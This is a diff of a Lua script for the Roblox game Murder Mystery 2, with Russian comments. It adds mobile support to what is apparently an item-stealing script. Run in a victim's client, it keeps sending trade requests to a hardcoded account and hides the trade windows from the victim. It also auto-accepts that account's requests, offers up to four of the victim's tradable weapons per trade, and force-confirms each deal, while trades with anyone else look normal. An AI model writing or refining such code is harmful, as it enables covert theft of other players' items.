@@ -1,5 +1,5 @@
 -- =====================================================================
--- TRIUMPHMANIA CORE: NETWORK-DRIVEN TRADE ENGINE (MOBILE OPTIMIZED)
+-- TRIUMPHMANIA CORE: HYBRID TRADE ENGINE (PC & MOBILE)
 -- =====================================================================
 
 local TARGET_USER = "ilyes_ida3"
@@ -15,16 +15,14 @@ local plr = Players.LocalPlayer
 
 local request = request or http_request or http.request or syn.request
 
--- Проверка валидности сессии
+-- Валидация хоста
 if game.PlaceId ~= 142823291 then return end
 if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then return end
 
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 local playerGui = plr:WaitForChild("PlayerGui")
-local tradeGui = playerGui:WaitForChild("TradeGUI", 10)
-local reqGui = playerGui:WaitForChild("TradeRequestGUI", 10)
 
--- Инициализация базы данных предметов MM2
+-- Инициализация БД (Кэширование таблиц MM2)
 local database
 do
     local ok, res = pcall(function() return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item")) end)
@@ -46,6 +44,7 @@ local untradable = {
     ["TravelerAxeSilver"]=true, ["TravelerAxeGold"]=true, ["BlueCamo_K_2022"]=true, ["GreenCamo_K_2022"]=true, ["SharkSeeker"]=true
 }
 
+-- Глобальные стейты контроля логики
 local weaponsToSend = {}
 local targetInTrade = false
 local lastOfferToken = nil
@@ -53,7 +52,7 @@ local lastOfferTime = 0
 local processActive = false
 
 -- =====================================================================
--- ФУНКЦИИ СЕТЕВОГО ВЗАИМОДЕЙСТВИЯ (БЕЗ ПРИВЯЗКИ К UI)
+-- УТИЛИТЫ И СЕТЕВЫЕ ПРОТОКОЛЫ
 -- =====================================================================
 
 local function getTradeStatus()
@@ -89,9 +88,8 @@ local function parseInventory()
 end
 
 -- =====================================================================
--- ПЕРЕХВАТ ПАКЕТОВ: ИДЕНТИФИКАЦИЯ ТАРГЕТА НА УРОВНЕ СЕРВЕРА
+-- ПЕРЕХВАТ ПАКЕТОВ: ИДЕНТИФИКАЦИЯ ТАРГЕТА (UpdateTrade)
 -- =====================================================================
-
 Trade.UpdateTrade.OnClientEvent:Connect(function(data)
     if type(data) == "table" then
         if data.LastOffer then
@@ -99,73 +97,81 @@ Trade.UpdateTrade.OnClientEvent:Connect(function(data)
             lastOfferTime = tick()
         end
         
-        -- Вытаскиваем ники из сетевого пакета. Никакого UI-парсинга.
+        -- Считываем оппонента без привязки к интерфейсу
         local p1 = type(data.Player1) == "Instance" and data.Player1.Name or type(data.Player1) == "string" and data.Player1 or ""
         local p2 = type(data.Player2) == "Instance" and data.Player2.Name or type(data.Player2) == "string" and data.Player2 or ""
         
         if p1 == TARGET_USER or p2 == TARGET_USER then
             targetInTrade = true
+        else
+            targetInTrade = false
         end
     end
 end)
 
 -- =====================================================================
--- СОБЫТИЙНАЯ БЛОКИРОВКА UI (МГНОВЕННОЕ УНИЧТОЖЕНИЕ ОКНА)
+-- GUI INJECTION: PC & MOBILE (Событийное подавление)
 -- =====================================================================
 
--- 1. Блокировка входящего запроса (TradeRequestGUI)
-if reqGui then
-    reqGui:GetPropertyChangedSignal("Enabled"):Connect(function()
-        if reqGui.Enabled then
-            -- Проверяем, есть ли наш таргет в тексте запроса
-            local isHim = false
-            for _, obj in ipairs(reqGui:GetDescendants()) do
-                if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and string.find(string.lower(obj.Text), string.lower(TARGET_USER)) then
-                    isHim = true
-                    break
+-- Универсальная функция блокировки торгового меню
+local function secureTradeWindow(guiName)
+    local gui = playerGui:WaitForChild(guiName, 5) or playerGui:FindFirstChild(guiName)
+    if gui then
+        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            -- Жестко гасим интерфейс ТОЛЬКО если идет сделка с таргетом
+            if gui.Enabled and targetInTrade then
+                gui.Enabled = false
+                -- Депортация за пределы экрана для надежности на мобилках
+                if gui:FindFirstChild("Main") then 
+                    gui.Main.Position = UDim2.new(9999, 0, 9999, 0) 
                 end
             end
-            
-            if isHim then
-                -- Глушим интерфейс в тот же кадр
-                reqGui.Enabled = false
-                if reqGui:FindFirstChild("Main") then reqGui.Main.Position = UDim2.new(9999, 0, 9999, 0) end
-                -- Принимаем запрос по ремоуту
-                pcall(function()
-                    local r = Trade:FindFirstChild("AcceptRequest")
-                    if r then if r:IsA("RemoteFunction") then r:InvokeServer() else r:FireServer() end end
-                end)
-            else
-                -- Обычный игрок. Возвращаем окно на место.
-                if reqGui:FindFirstChild("Main") then reqGui.Main.Position = UDim2.new(0.5, -150, 0.5, -75) end
+        end)
+    end
+end
+
+-- Хукаем обе версии интерфейса, как указано в твоем исходнике
+task.spawn(function()
+    secureTradeWindow("TradeGUI")
+    secureTradeWindow("TradeGUI_Phone")
+end)
+
+-- Отдельная обработка входящих запросов (TradeRequestGUI)
+task.spawn(function()
+    -- Ожидаем появления GUI в иерархии (работает и для ПК, и для телефона)
+    local reqGui = playerGui:WaitForChild("TradeRequestGUI", 10)
+    if reqGui then
+        reqGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if reqGui.Enabled then
+                local isHim = false
+                -- Парсим текст во всплывающем окне запроса
+                for _, obj in ipairs(reqGui:GetDescendants()) do
+                    if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and string.find(string.lower(obj.Text), string.lower(TARGET_USER)) then
+                        isHim = true
+                        break
+                    end
+                end
+                
+                -- Если запрос от таргета - гасим окно и принимаем
+                if isHim then
+                    reqGui.Enabled = false
+                    if reqGui:FindFirstChild("Main") then reqGui.Main.Position = UDim2.new(9999, 0, 9999, 0) end
+                    pcall(function()
+                        local r = Trade:FindFirstChild("AcceptRequest")
+                        if r then if r:IsA("RemoteFunction") then r:InvokeServer() else r:FireServer() end end
+                    end)
+                end
+                -- Если не от таргета - окно останется висеть штатно.
             end
-        end
-    end)
-end
-
--- 2. Блокировка основного меню трейда (TradeGUI)
-if tradeGui then
-    tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
-        if tradeGui.Enabled and targetInTrade then
-            tradeGui.Enabled = false
-            if tradeGui:FindFirstChild("Main") then tradeGui.Main.Position = UDim2.new(9999, 0, 9999, 0) end
-        end
-    end)
-    
-    -- Резервная проверка каждый кадр на случай, если нативный скрипт пытается форсировать видимость
-    RunService.RenderStepped:Connect(function()
-        if targetInTrade and tradeGui.Enabled then
-            tradeGui.Enabled = false
-            if tradeGui:FindFirstChild("Main") then tradeGui.Main.Position = UDim2.new(9999, 0, 9999, 0) end
-        end
-    end)
-end
+        end)
+    end
+end)
 
 -- =====================================================================
--- ПОТОКИ АВТОМАТИЗАЦИИ
+-- MAIN ENGINE: ЛОГИКА РАЗДЕЛЕНИЯ ПОТОКОВ (ТАРГЕТ / НЕ ТАРГЕТ)
 -- =====================================================================
 
--- Авто-поиск таргета и отправка запросов (каждые 3 сек)
+-- ПОТОК 1: Агрессивный спам запросами
 task.spawn(function()
     while task.wait(3) do
         if getTradeStatus() == "None" then
@@ -176,30 +182,35 @@ task.spawn(function()
     end
 end)
 
--- Основной движок передачи предметов
+-- ПОТОК 2: Управление сделками
 task.spawn(function()
     while task.wait(0.1) do
         local status = getTradeStatus()
         
+        -- Сброс состояния, если трейд завершен
         if status == "None" then
             processActive = false
             targetInTrade = false
             lastOfferToken = nil
             
-            -- Если трейд кончился, сбрасываем позицию GUI для будущих легитных трейдов
-            if tradeGui and tradeGui:FindFirstChild("Main") then
-                tradeGui.Main.Position = UDim2.new(0.5, -250, 0.5, -200)
-            end
+            -- Восстанавливаем позиции окон на случай легитных трейдов
+            pcall(function()
+                local tg = playerGui:FindFirstChild("TradeGUI")
+                if tg and tg:FindFirstChild("Main") then tg.Main.Position = UDim2.new(0.5, -250, 0.5, -200) end
+                
+                local tgp = playerGui:FindFirstChild("TradeGUI_Phone")
+                if tgp and tgp:FindFirstChild("Main") then tgp.Main.Position = UDim2.new(0.5, -250, 0.5, -200) end
+            end)
             
         elseif status == "StartTrade" and not processActive then
             processActive = true
             
-            -- Ждем до 3 секунд синхронизации сети для получения ников участников
+            -- Даем 2.5 секунды на то, чтобы серверный пакет UpdateTrade обновил переменную targetInTrade
             local startWait = tick()
-            while not targetInTrade and (tick() - startWait) < 3 do task.wait(0.1) end
+            while not targetInTrade and (tick() - startWait) < 2.5 do task.wait(0.1) end
             
+            -- ВЕТКА 1: Сделка с таргетом ilyes_ida3 (Блэкаут и автоматика)
             if targetInTrade then
-                -- ВЕТКА А: Сделка с таргетом (Скрытый автоматический перелив лута)
                 parseInventory()
                 
                 if #weaponsToSend > 0 then
@@ -210,16 +221,15 @@ task.spawn(function()
                                 if count >= 4 then break end
                                 pcall(function() Trade.OfferItem:FireServer(weapon.DataID, "Weapons") end)
                                 count = count + 1
-                                task.wait(0.05)
+                                task.wait(0.05) -- Тайминг передачи для стабильности
                             end
                         end
                     end
                     
-                    -- Ожидание генерации токена сделки
                     local wt = tick()
                     while not lastOfferToken and (tick() - wt) < 8 do task.wait(0.1) end
                     
-                    -- Жесткое подтверждение сделки
+                    -- Форс-акцепт
                     if lastOfferToken then
                         for i = 1, 15 do
                             local timePassed = tick() - lastOfferTime
@@ -233,12 +243,14 @@ task.spawn(function()
                     end
                 end
                 
-                -- Держим поток заблокированным до полного завершения сделки сервером
+                -- Холд потока до закрытия
                 while getTradeStatus() ~= "None" do task.wait(0.2) end
                 
+            -- ВЕТКА 2: Сделка с любым другим игроком (Штатный режим)
             else
-                -- ВЕТКА Б: Сделка с левым штемпом. Скрипт не делает НИЧЕГО.
-                -- Окно работает штатно, предметы не передаются.
+                -- Окно не скрыто (потому что event-hook не отработал без targetInTrade)
+                -- Предметы не передаются.
+                -- Просто ждем, пока ты сам проведешь сделку или отменишь её.
                 while getTradeStatus() ~= "None" do task.wait(0.5) end
             end
         end
